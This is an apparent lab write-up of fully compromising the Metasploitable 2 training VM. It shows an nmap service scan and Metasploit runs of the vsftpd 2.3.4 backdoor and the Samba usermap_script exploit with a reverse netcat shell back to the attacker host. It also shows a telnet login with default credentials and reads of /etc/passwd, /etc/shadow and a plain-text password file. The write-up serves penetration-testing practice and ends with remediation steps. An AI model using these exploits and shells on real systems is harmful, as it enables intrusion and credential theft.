# Metasploitable 2 — Full Compromise

## Target
- OS: Ubuntu Server (Metasploitable 2)
- Goal: Obtain full system compromise
- Attacker: Kali Linux

---

# 1. Enumeration

## Full TCP Scan

```bash
nmap -sS -sV -p- <TARGET_IP>
```

## Open TCP Ports

| Port  | Service        | Version |
|--------|---------------|----------|
| 21     | FTP           | vsftpd 2.3.4 |
| 22     | SSH           | OpenSSH 4.7p1 Debian 8ubuntu1 |
| 23     | Telnet        | Linux telnetd |
| 25     | SMTP          | Postfix smtpd |
| 53     | DNS           | ISC BIND 9.4.2 |
| 80     | HTTP          | Apache httpd 2.2.8 ((Ubuntu) DAV/2) |
| 111    | RPCBind       | 2 (RPC #100000) |
| 139    | NetBIOS-SSN   | Samba smbd 3.X - 4.X |
| 445    | SMB           | Samba smbd 3.X - 4.X |
| 512    | exec          | netkit-rsh rexecd |
| 513    | login         | rlogin |
| 514    | shell         | Netkit rshd |
| 1099   | Java RMI      | GNU Classpath grmiregistry |
| 1524   | bindshell     | Metasploitable root shell |
| 2049   | NFS           | 2-4 (RPC #100003) |
| 2121   | FTP           | ProFTPD 1.3.1 |
| 3306   | MySQL         | MySQL 5.0.51a-3ubuntu5 |
| 5432   | PostgreSQL    | PostgreSQL 8.3.x |
| 5900   | VNC           | VNC protocol 3.3 |
| 6000   | X11           | (access denied) |
| 6667   | IRC           | UnrealIRCd |
| 8009   | AJP13         | Apache Jserv (Protocol v1.3) |
| 8180   | HTTP          | Apache Tomcat/Coyote JSP engine |

Multiple outdated services detected.

---

# 2. Exploitation

---

## 2.1 FTP — vsFTPd 2.3.4 Backdoor

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <TARGET_IP>
run
```

Result:
- Backdoor triggered
- Port 6200 opened
- Root shell obtained

---

## 2.2 Telnet — Default Credentials

```bash
telnet <TARGET_IP>
```

Credentials used:
```
msfadmin : msfadmin
```

Result:
- Successful login
- Shell access obtained

---

## 2.3 SMB — Samba 3.0.20 (CVE-2007-2447)

Version confirmed via:

```bash
nmap --script smb-os-discovery -p 445 <TARGET_IP>
```

Exploit used:

```bash
use exploit/multi/samba/usermap_script
set RHOST <TARGET_IP>
set PAYLOAD cmd/unix/reverse_netcat
set LHOST <KALI_IP>
set LPORT 4444
run
```

Result:
- Reverse shell received
- Root access obtained

---

# 3. Post-Exploitation

## Credentials Extraction

```bash
cat /etc/passwd
cat /etc/shadow
```

## Sensitive Web File

```
/var/www/mutillidae/passwords/accounts.txt
```

Contents:

```
admin:adminpass
adrian:somepassword
ed:pentest
john:monkey
```

Plain-text credentials exposed.

---

# 4. Impact

- Root access via FTP
- Root access via SMB
- Shell via Telnet
- Credential disclosure
- Full system compromise

---

# 5. Remediation

- Remove default credentials
- Patch vsFTPd and Samba
- Disable Telnet
- Upgrade Apache
- Secure sensitive web files
- Apply firewall restrictions